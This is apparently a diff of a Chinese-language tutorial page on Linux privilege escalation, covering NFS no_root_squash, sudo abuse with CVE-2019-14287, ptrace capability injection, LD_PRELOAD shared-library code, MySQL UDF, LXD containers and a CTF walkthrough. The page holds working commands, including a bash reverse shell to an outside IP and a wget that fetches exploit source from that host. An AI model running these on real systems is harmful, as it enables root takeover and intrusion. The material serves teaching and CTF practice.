+<h3 id="3-5-NFS-提权"><a href="#3-5-NFS-提权" class="headerlink" title="3.5 NFS 提权"></a>3.5 NFS 提权</h3><p><strong>提权原理</strong></p>
 <p>当 <code>/etc/exports</code> 中以 <code>no_root_squash</code> 挂载目录时，NFS 客户端的 root 用户在共享目录中仍以 root 身份写文件。</p>
 <p><strong>提权步骤</strong></p>
-<p>首先在 kali 中查看一下靶机的 NFS 目录路径</p>
+<p>在攻击机上查看靶机的 NFS 共享目录：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">showmount -e 192.168.52.144<br><span class="hljs-built_in">mkdir</span> /tmp/mnt<br>mount -t nfs 192.168.52.144:/mnt/nfs /tmp/mnt<br><span class="hljs-built_in">cd</span> /tmp/mnt<br></code></pre></td></tr></table></figure>
 
-<p>使用 kali 在共享目录放置带 SUID 的 shell</p>
+<p>在攻击机上向共享目录写入一个带 SUID 权限的 bash：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /bin/bash /tmp/mnt/rootshell<br><span class="hljs-built_in">chmod</span> u+s /tmp/mnt/rootshell<br><span class="hljs-built_in">chown</span> root:root /tmp/mnt/rootshell<br></code></pre></td></tr></table></figure>
 
-<p>然后在靶机上执行该 suid 权限的文件即可成功提权</p>
+<p>回到靶机上执行该文件，由于 SUID 位的存在，进程将以 root 身份运行：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">/tmp/share/rootshell<br></code></pre></td></tr></table></figure>
 
-<h3 id="Capability-提权"><a href="#Capability-提权" class="headerlink" title="Capability 提权"></a>Capability 提权</h3><p><strong>提权原理</strong></p>
-<p>Linux capabilities 将 root 权限拆分为若干细粒度能力（如 <code>cap_setuid</code>、<code>cap_dac_read_search</code>）。若程序被赋予了危险 capability，可被用于提权。</p>
+<hr>
+<h2 id="四、特权滥用提权"><a href="#四、特权滥用提权" class="headerlink" title="四、特权滥用提权"></a>四、特权滥用提权</h2><p>利用已有特权（sudo 规则、Linux Capabilities）进行权限提升。这类方法不依赖内核漏洞，而是利用管理员授予的过度权限——本质上是”合法权限的不当使用”。</p>
+<h3 id="4-1-SUDO-提权"><a href="#4-1-SUDO-提权" class="headerlink" title="4.1 SUDO 提权"></a>4.1 SUDO 提权</h3><p><strong>提权原理</strong></p>
+<p><code>sudo</code> 允许管理员在 <code>/etc/sudoers</code> 中授权某些用户以特定身份执行特定命令。如果授权了可被滥用的程序（如 <code>find</code>、<code>perl</code>、<code>python</code>、<code>vim</code>），攻击者可通过这些程序逃逸出受限环境获得 root shell。</p>
+<blockquote>
+<p>sudo 提权的前提是拥有一个<strong>普通用户权限的交互式 shell</strong>。Web 服务用户（如 <code>www-data</code>）通常权限较低且缺乏完整的终端环境，需要先提权到普通用户再利用 sudo。</p>
+</blockquote>
 <p><strong>提权步骤</strong></p>
-<p>查找带 capability 的可执行文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">getcap</span> -r / 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+<p><code>sudo -l</code> 命令查看当前用户可用的 sudo 权限：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">sudo</span> -l<br>(ALL, !root) NOPASSWD: /usr/bin/sqlite3<br></code></pre></td></tr></table></figure>
 
-<p>常见危险 capability：</p>
+<p>在 <a href="https://gtfobins.org/">GTFOBins</a> 中查询 <code>sqlite3</code> 的利用方式，可知通过 <code>sqlite3 /dev/null &#39;.shell /bin/sh&#39;</code> 可获取 shell。</p>
+<p>此处 sudoers 规则中 <code>!root</code> 禁止以 root 身份执行，但可以配合 <code>CVE-2019-14287</code> 绕过该限制：</p>
+<blockquote>
+<p><strong>CVE-2019-14287</strong>：当 sudoers 中出现 <code>RunAs ALL</code> 且用户名以 <code>#</code> 开头时，<code>sudo -u &quot;#-1&quot;</code> 会以 UID 0（root）执行，绕过 root 限制。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -u#-1 sqlite3 /dev/null <span class="hljs-string">&#x27;.shell /bin/sh&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="4-2-Capability-提权"><a href="#4-2-Capability-提权" class="headerlink" title="4.2 Capability 提权"></a>4.2 Capability 提权</h3><p><strong>提权原理</strong></p>
+<p>Linux capabilities 将传统的 root 全能权限拆分为若干细粒度能力（如 <code>cap_setuid</code>、<code>cap_dac_read_search</code>）。若某个程序被赋予了危险 capability，攻击者便可借此实现提权。</p>
+<p><strong>常见危险 Capability：</strong></p>
 <table>
 <thead>
 <tr>
@@ -5655,91 +5737,711 @@ flag为这些答案总和的md5（以<a href="https://cyberchef.org/%E7%BD%91%E7
 <td>注入其他进程</td>
 </tr>
 </tbody></table>
-<p>这里是 <code>cap_sys_ptrace</code>，需要通过进程注入来提权，需要用到 <code>inject.py</code> 脚本，批处理把所有进程都注入一下</p>
+<p><strong>提权步骤</strong></p>
+<p>扫描系统中被赋予 capability 的可执行文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">getcap</span> -r / 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<p>本例中目标程序具有 <code>cap_sys_ptrace</code>，可通过进程注入实现提权。使用 <code>inject.py</code> 脚本，遍历所有 root 进程进行注入：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `ps -ef|grep root|grep -v <span class="hljs-string">&quot;grep&quot;</span>|awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>`; <span class="hljs-keyword">do</span> python2.7 inject.py <span class="hljs-variable">$i</span>; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
 
-<p>等进程注入完之后，nc 连接 5600 端口，连接成功，成功提权</p>
+<p>注入完成后，使用 nc 连接 5600 端口即可获得 root shell：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nc 192.168.52.144 5600<br></code></pre></td></tr></table></figure>
 
-<h3 id="LD-PRELOAD-提权"><a href="#LD-PRELOAD-提权" class="headerlink" title="LD_PRELOAD 提权"></a>LD_PRELOAD 提权</h3><p><strong>提权原理</strong></p>
-<p>LD_PRELOAD 是 Linux 系统的环境变量，允许用户指定在程序运行前优先加载的动态链接库（.so 文件）。动态链接器在加载程序时，会优先加载 LD_PRELOAD 指定的库，覆盖程序原本依赖的库函数。通过劫持目标程序调用的关键函数（如 getuid、strcmp 等），攻击者可注入恶意代码实现提权。</p>
-<p><strong>提权步骤</strong></p>
-<p>使用 sudo -l 命令查看 sudo 无密码可执行的文件，明显 1.sh 无法通过 sudo 来提权，因为 sudo 只能用特定的文件提权，但是一旦设置了 LDPRELOAD，那么只要有可执行文件即可提权。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">test</span> ALL=(ALL:ALL) NOPASSWD: /tmp/1.sh<br></code></pre></td></tr></table></figure>
-
-<p>首先编写恶意动态库，C 代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">void</span> _init() &#123;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    setgid(<span class="hljs-number">0</span>);<br>    setuid(<span class="hljs-number">0</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>编译 C 代码为恶意动态库，然后让程序执行前先加载恶意动态库即可完成提权</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gcc -fPIC -shared -o shell.so shell.c -nostartfiles <span class="hljs-built_in">ls</span> -al shell.so<br><span class="hljs-built_in">sudo</span> LD_PRELOAD=/tmp/shell.so /tmp/1.sh<br></code></pre></td></tr></table></figure>
-
-<h3 id="LXD-容器提权"><a href="#LXD-容器提权" class="headerlink" title="LXD 容器提权"></a>LXD 容器提权</h3><p><strong>提权原理</strong></p>
-<p>LXD（Linux Container Daemon）是一种基于 LXC 的系统容器管理器，通过 REST API 提供容器管理能力。其提权漏洞的核心在于特权容器（Privileged Container）的配置缺陷：</p>
-<ul>
-<li><strong>特权容器特性：</strong> 当容器以 security.privileged=true 启动时，容器内的 root 用户直接映射到宿主机的 root 用户，绕过了 Linux 用户命名空间的隔离机制</li>
-<li><strong>文件系统挂载：</strong> 通过 <code>lxc config device add</code> 命令将宿主机根目录（&#x2F;）挂载到容器内（如 <code>/mnt/root</code>），容器内可直接读写宿主机的文件系统，实现权限逃逸</li>
-</ul>
-<p><strong>提权步骤</strong></p>
-<p>准备特权容器镜像，靶机下载预构建的 Alpine 镜像</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python -m http.server 6666  <span class="hljs-comment"># 本地启动HTTP服务</span><br>wget ip:6666/alpine-v3.13-x86_64-20210218_0139.tar.gz  <span class="hljs-comment"># 目标主机下载</span><br></code></pre></td></tr></table></figure>
-
-<p>创建并配置特权容器</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --<span class="hljs-built_in">alias</span> myimage    <span class="hljs-comment"># 导入镜像</span><br>lxc init myimage <span class="hljs-built_in">test</span> -c security.privileged=<span class="hljs-literal">true</span>    <span class="hljs-comment"># 创建特权容器（容器名 test，基于镜像 myimage）</span><br>lxc config device add <span class="hljs-built_in">test</span> shellroot disk <span class="hljs-built_in">source</span>=/ path=/mnt/root recursive=<span class="hljs-literal">true</span>    <span class="hljs-comment"># 挂载宿主机根目录（设备名 shellroot）</span><br>lxc start <span class="hljs-built_in">test</span>    <span class="hljs-comment"># 启动容器</span><br>lxc <span class="hljs-built_in">exec</span> <span class="hljs-built_in">test</span> /bin/sh    <span class="hljs-comment"># 进入容器Shell</span><br></code></pre></td></tr></table></figure>
-
-<p>访问宿主机文件系统，这里的 <code>/mnt/root/</code> 就是靶机的根目录，可以查看任意文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /mnt/root/root<br><span class="hljs-built_in">cat</span> flag.txt<br></code></pre></td></tr></table></figure>
-
-<h2 id="UDF提权简介"><a href="#UDF提权简介" class="headerlink" title="UDF提权简介"></a>UDF提权简介</h2><h3 id="提权原理-4"><a href="#提权原理-4" class="headerlink" title="提权原理"></a>提权原理</h3><p>UDF（User Defined Function，用户自定义函数）是 MySQL &#x2F; MariaDB 提供的扩展机制，允许用户用 C&#x2F;C++ 编写自定义函数，编译为共享库（<code>.so</code>）后加载到数据库中作为 SQL 函数调用。若 MySQL 以 root 身份运行，且攻击者拥有 MySQL 高权限账户（或通过 SQL 注入获得写权限），即可上传恶意 <code>.so</code>，注册一个调用 <code>system()</code> 的 UDF，从而以 root 身份执行任意系统命令。利用条件如下：</p>
+<hr>
+<h2 id="五、服务利用提权"><a href="#五、服务利用提权" class="headerlink" title="五、服务利用提权"></a>五、服务利用提权</h2><p>利用以 root 身份运行的服务（如 MySQL、LXD）的配置缺陷或功能特性实现提权。这类方法的关键在于：服务本身以高权限运行，且攻击者能够利用其功能执行系统命令或访问宿主文件系统。</p>
+<h3 id="5-1-UDF-提权"><a href="#5-1-UDF-提权" class="headerlink" title="5.1 UDF 提权"></a>5.1 UDF 提权</h3><p><strong>提权原理</strong></p>
+<p>UDF（User Defined Function，用户自定义函数）是 MySQL &#x2F; MariaDB 的扩展机制，允许用户用 C&#x2F;C++ 编写自定义函数，编译为共享库（<code>.so</code>）后加载到数据库中作为 SQL 函数调用。若 MySQL 以 root 身份运行，且攻击者拥有高权限数据库账户（或通过 SQL 注入获得写权限），即可上传恶意 <code>.so</code> 文件，注册一个调用 <code>system()</code> 的 UDF，从而以 root 身份执行任意系统命令。</p>
+<p><strong>利用条件：</strong></p>
 <ul>
 <li>MySQL 服务以 root 或较高权限用户运行</li>
 <li><code>secure_file_priv</code> 未限制导出路径，或限制路径可写（MySQL 5.7+ 默认 <code>/var/lib/mysql-files/</code>）</li>
 <li>知道 MySQL 插件目录路径（<code>@@plugin_dir</code>）</li>
 </ul>
-<h3 id="提权步骤-4"><a href="#提权步骤-4" class="headerlink" title="提权步骤"></a>提权步骤</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain"># 查看版本、权限和plugin位置等基础信息<br>select version();<br>show variables like &#x27;version_compile_%&#x27;;&quot;<br>show global variables like &#x27;%secure_file_priv%&#x27;;<br>show variables like &#x27;%secure%&#x27;;&quot;<br>select user();<br>select * from mysql.user where user = substring_index(user(), &#x27;@&#x27;, 1)\G;<br>show variables like &#x27;%plugin%&#x27;;<br><br>#下载并编译kali上自带的searchsploit搜索得到的udf.c<br>wget http://156.238.233.78:7777/udf.c<br>gcc -g -c udf.c -fPIC<br>gcc -g -shared -Wl,-soname,udf.so -o udf.so udf.o -lc<br><br>#创建自定义函数do_system，函数由udf.so实现，可执行任意命令<br>select load_file(&#x27;/tmp/udf.so&#x27;) into dumpfile &#x27;//usr/lib/mysql/plugin/udf.so&#x27;;<br>create function do_system returns integer soname &#x27;udf.so&#x27;;<br>select * from mysql.func;<br>select do_system(&#x27;chmod 777 /flag&#x27;);<br>select do_system(&#x27;tac /flag&#x27;);<br></code></pre></td></tr></table></figure>
+<p><strong>提权步骤</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 查看版本、权限和 plugin 位置等基础信息</span><br><span class="hljs-keyword">select</span> version();<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;version_compile_%&#x27;</span>;<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>();<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.user <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> <span class="hljs-operator">=</span> substring_index(<span class="hljs-keyword">user</span>(), <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-number">1</span>)\G;<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br></code></pre></td></tr></table></figure>
 
-<h3 id="例题详解"><a href="#例题详解" class="headerlink" title="例题详解"></a>例题详解</h3><blockquote>
-<p><strong>例题：2024年春秋杯网络安全联赛夏季赛-brother</strong></p>
+<p>下载并编译 UDF 文件（使用 ExploitDB 的 <code>searchsploit</code> 工具）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">searchsploit mysql udf<br>searchsploit mysql udf -m 1518<br><span class="hljs-built_in">mv</span> 1518.c udf.c<br><br><span class="hljs-comment"># 编译</span><br>gcc -g -c udf.c -fPIC<br>gcc -g -shared -Wl,-soname,udf.so -o udf.so udf.o -lc<br></code></pre></td></tr></table></figure>
+
+<p>将编译好的 <code>.so</code> 文件写入 plugin 目录并注册为自定义函数：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 写入恶意共享库</span><br><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;/tmp/udf.so&#x27;</span>) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;<br><br><span class="hljs-comment">-- 创建自定义函数 do_system，可执行任意系统命令</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> do_system <span class="hljs-keyword">returns</span> <span class="hljs-type">integer</span> soname <span class="hljs-string">&#x27;udf.so&#x27;</span>;<br><br><span class="hljs-comment">-- 验证创建成功</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func;<br><br><span class="hljs-comment">-- 执行系统命令</span><br><span class="hljs-keyword">select</span> do_system(<span class="hljs-string">&#x27;chmod 777 /flag&#x27;</span>);<br><span class="hljs-keyword">select</span> do_system(<span class="hljs-string">&#x27;tac /flag&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<h3 id="5-2-例题详解：2024-年春秋杯网络安全联赛夏季赛-—-brother"><a href="#5-2-例题详解：2024-年春秋杯网络安全联赛夏季赛-—-brother" class="headerlink" title="5.2 例题详解：2024 年春秋杯网络安全联赛夏季赛 — brother"></a>5.2 例题详解：2024 年春秋杯网络安全联赛夏季赛 — brother</h3><blockquote>
+<p>前面是一个无 WAF 的 SSTI 漏洞，使用 <a href="https://github.com/marblexle/fenjing">fenjing</a> 自动化注入，执行反弹 shell 命令：</p>
 </blockquote>
-<p>前面是一个无 waf 的 SSTI，fenjing 一把梭了，执行反弹 shell 命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/156.238.233.78/2233 0&gt;&amp;1&#x27;<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/156.238.233.78/2233 0&gt;&amp;1&#x27;</span><br></code></pre></td></tr></table></figure>
 
-<p>没有权限无法直接拿到 flag，当前目录下有执行 sql 查询脚本，并且给出了数据库账号密码，可以尝试 udf 提权</p>
-<p><img src="https://img3.tofaka.com/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260726/folder-ms1t4fv3-fkzl5ccm/assets/network-asset-1736689553951-39abf991-455d-4039-9f33-cede912b4003-20250113091600-r9wazg6.png"></p>
-<p>使用如下命令可以无交互的执行 sql 语句</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">mysql -uctf -p123456 -e &quot;&quot;;<br></code></pre></td></tr></table></figure>
+<p>当前权限不足以直接读取 flag，但目录下存在一个 SQL 查询脚本且附带了数据库账号密码，符合 UDF 提权的利用条件：</p>
+<p><img src="https://s1.eisite.cn/autoupload/41kgv/20260823/folder-mt5t042i-dxtnh39a/assets/network-asset-1736689553951-39abf991-455d-4039-9f33-cede912b4003-20250113091600-r9wazg6.png"></p>
+<p>使用 <code>-e</code> 参数可以无交互地执行 SQL 语句：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">mysql -uctf -p123456 -e <span class="hljs-string">&quot;&quot;</span>;<br></code></pre></td></tr></table></figure>
 
 <p><strong>查看利用条件</strong></p>
-<p>首先查看数据库的版本和系统信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">mysql -uctf -p123456 -Dmysql -e &quot;select version();&quot;;<br>mysql -uctf -p123456 -e &quot;show variables like &#x27;version_compile_%&#x27;;&quot;;<br></code></pre></td></tr></table></figure>
+<p>首先查看数据库的版本和系统信息：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">mysql -uctf -p123456 -Dmysql -e <span class="hljs-string">&quot;select version();&quot;</span>;<br>mysql -uctf -p123456 -e <span class="hljs-string">&quot;show variables like &#x27;version_compile_%&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img3.tofaka.com/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260726/folder-ms1t4fv3-fkzl5ccm/assets/network-asset-1736689824468-4fc19464-87b2-4b75-96ae-c048a7dd99f7-20250113091600-yk1j9qc.png"></p>
-<p>核验 <code>secure_file_priv</code> 是否为空，也就是查看是否允许导入导出文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">mysql -uctf -p123456 -e &quot;show global variables like &#x27;%secure_file_priv%&#x27;;&quot;;<br>mysql -uctf -p123456 -e &quot;show variables like &#x27;%secure%&#x27;;&quot;<br></code></pre></td></tr></table></figure>
+<p><img src="https://s1.eisite.cn/autoupload/41kgv/20260823/folder-mt5t042i-dxtnh39a/assets/network-asset-1736689824468-4fc19464-87b2-4b75-96ae-c048a7dd99f7-20250113091600-yk1j9qc.png"></p>
+<p>核验 <code>secure_file_priv</code> 是否为空（空值表示允许导入导出到任意路径）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">mysql -uctf -p123456 -e <span class="hljs-string">&quot;show global variables like &#x27;%secure_file_priv%&#x27;;&quot;</span>;<br>mysql -uctf -p123456 -e <span class="hljs-string">&quot;show variables like &#x27;%secure%&#x27;;&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p>使用如下命令查看插件的位置，得到 plugin 目录 <code>/usr/lib/mysql/plugin/</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">mysql -uctf -p123456 -e &quot;show variables like &#x27;%plugin%&#x27;;&quot;;<br></code></pre></td></tr></table></figure>
+<p>查看插件目录路径，确认为 <code>/usr/lib/mysql/plugin/</code>：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">mysql -uctf -p123456 -e <span class="hljs-string">&quot;show variables like &#x27;%plugin%&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure>
 
 <p><strong>下载编译 UDF 文件</strong></p>
-<p>使用 kali 得到 UDF 文件，UDF 提权需要有个可以执行系统命令的 UDF 文件，我们使用 searchsploit 获得 UDF 文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">searchsploit mysql udf<br>searchsploit mysql udf -m 1518<br>mv 1518.c udf.c<br></code></pre></td></tr></table></figure>
-
-<p>先将 <code>udf.c</code> 上传到自己的 VPS 上，再使用 wget 命令下载，下载好后需要编译 <code>udf.c</code> 文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">cd /tmp<br>wget http://156.238.233.78:7777/udf.c<br>gcc -g -c udf.c -fPIC<br>gcc -g -shared -Wl,-soname,udf.so -o udf.so udf.o -lc<br></code></pre></td></tr></table></figure>
+<p>在攻击机上使用 <code>searchsploit</code> 获取 UDF 源码，编译后通过 HTTP 传到靶机：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">searchsploit mysql udf<br>searchsploit mysql udf -m 1518<br><span class="hljs-built_in">mv</span> 1518.c udf.c<br><br><span class="hljs-built_in">cd</span> /tmp<br>wget http://156.238.233.78:7777/udf.c<br>gcc -g -c udf.c -fPIC<br>gcc -g -shared -Wl,-soname,udf.so -o udf.so udf.o -lc<br></code></pre></td></tr></table></figure>
 
 <p><strong>创建自定义函数</strong></p>
-<p>编译完成后将 tmp 目录下的 <code>udf.so</code> 文件移动到 plugin 文件夹下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">mysql -uctf -p123456 -e &quot;select load_file(&#x27;/tmp/udf.so&#x27;) into dumpfile &#x27;//usr/lib/mysql/plugin/udf.so&#x27;;&quot;;<br></code></pre></td></tr></table></figure>
+<p>编译完成后，通过 SQL 语句将 <code>.so</code> 文件写入 plugin 目录：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">mysql -uctf -p123456 -e <span class="hljs-string">&quot;select load_file(&#x27;/tmp/udf.so&#x27;) into dumpfile &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure>
 
-<p>创建自定义函数 <code>do_system</code>，该函数的实现由我们上传的恶意提权文件 <code>udf.so</code> 提供</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">mysql -uctf -p123456 -e &quot;create function do_system returns integer soname &#x27;udf.so&#x27;;&quot;;<br></code></pre></td></tr></table></figure>
+<p>创建自定义函数 <code>do_system</code>：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">mysql -uctf -p123456 -e <span class="hljs-string">&quot;create function do_system returns integer soname &#x27;udf.so&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure>
 
-<p>创建完成后判断是否创建成功，如果有回显就代表成功了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">mysql -uctf -p123456 -e &quot;select * from mysql.func;&quot;;<br></code></pre></td></tr></table></figure>
+<p>验证函数是否注册成功：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">mysql -uctf -p123456 -e <span class="hljs-string">&quot;select * from mysql.func;&quot;</span>;<br></code></pre></td></tr></table></figure>
 
-<p>执行命令，成功提权，得到 flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plain">mysql -uctf -p123456 -e &quot;select do_system(&#x27;chmod 777 /flag&#x27;);&quot;;<br>mysql -uctf -p123456 -e &quot;select do_system(&#x27;tac /flag&#x27;);&quot;;<br></code></pre></td></tr></table></figure>
+<p>通过 <code>do_system</code> 执行系统命令修改 flag 权限并读取，完成提权：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">mysql -uctf -p123456 -e <span class="hljs-string">&quot;select do_system(&#x27;chmod 777 /flag&#x27;);&quot;</span>;<br>mysql -uctf -p123456 -e <span class="hljs-string">&quot;select do_system(&#x27;tac /flag&#x27;);&quot;</span>;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img3.tofaka.com/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260726/folder-ms1t4fv3-fkzl5ccm/assets/network-asset-1736691527984-d205c76b-ecaf-4ddf-80f4-accaaa16f82f-20250113091600-0fqcidk.png"></p>
+<p><img src="https://s1.eisite.cn/autoupload/41kgv/20260823/folder-mt5t042i-dxtnh39a/assets/network-asset-1736691527984-d205c76b-ecaf-4ddf-80f4-accaaa16f82f-20250113091600-0fqcidk.png"></p>
+<h3 id="5-3-LXD-容器提权"><a href="#5-3-LXD-容器提权" class="headerlink" title="5.3 LXD 容器提权"></a>5.3 LXD 容器提权</h3><p><strong>提权原理</strong></p>
+<p>LXD（Linux Container Daemon）是基于 LXC 的系统容器管理器。其提权的核心在于特权容器（Privileged Container）的配置缺陷：</p>
+<ul>
+<li><strong>特权容器特性</strong>：当容器以 <code>security.privileged=true</code> 启动时，容器内的 root 用户直接映射到宿主机的 root 用户，绕过了 Linux 用户命名空间的隔离机制。</li>
+<li><strong>文件系统挂载</strong>：通过 <code>lxc config device add</code> 命令将宿主机根目录（<code>/</code>）挂载到容器内（如 <code>/mnt/root</code>），容器内即可直接读写宿主机文件系统，实现权限逃逸。</li>
+</ul>
+<p><strong>提权步骤</strong></p>
+<p>首先在攻击机上准备 Alpine 镜像，通过 HTTP 服务传到靶机：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python -m http.server 6666                          <span class="hljs-comment"># 本地启动 HTTP 服务</span><br>wget ip:6666/alpine-v3.13-x86_64-20210218_0139.tar.gz  <span class="hljs-comment"># 目标主机下载</span><br></code></pre></td></tr></table></figure>
+
+<p>创建并配置特权容器：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --<span class="hljs-built_in">alias</span> myimage<br>lxc init myimage <span class="hljs-built_in">test</span> -c security.privileged=<span class="hljs-literal">true</span><br>lxc config device add <span class="hljs-built_in">test</span> shellroot disk <span class="hljs-built_in">source</span>=/ path=/mnt/root recursive=<span class="hljs-literal">true</span><br>lxc start <span class="hljs-built_in">test</span><br>lxc <span class="hljs-built_in">exec</span> <span class="hljs-built_in">test</span> /bin/sh<br></code></pre></td></tr></table></figure>
+
+<p>进入容器后，<code>/mnt/root/</code> 即为靶机的根目录，可直接访问宿主机文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /mnt/root/root<br><span class="hljs-built_in">cat</span> flag.txt<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、环境劫持提权"><a href="#六、环境劫持提权" class="headerlink" title="六、环境劫持提权"></a>六、环境劫持提权</h2><p>通过修改程序运行环境（PATH 变量、动态链接库）使目标程序加载攻击者的恶意代码，从而在高权限上下文中执行任意命令。这类方法不需要内核漏洞或配置错误，而是利用程序对运行环境的信任。</p>
+<h3 id="6-1-PATH-提权"><a href="#6-1-PATH-提权" class="headerlink" title="6.1 PATH 提权"></a>6.1 PATH 提权</h3><p><strong>提权原理</strong></p>
+<p>若某个 SUID &#x2F; sudo &#x2F; cron 程序调用了未使用绝对路径的外部命令，攻击者可通过修改 <code>PATH</code> 环境变量让程序优先加载自定义的恶意版本。</p>
+<p><strong>提权步骤</strong></p>
+<p>扫描 SUID 文件时发现一个非标准的自定义程序 <code>/opt/statuscheck</code>：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
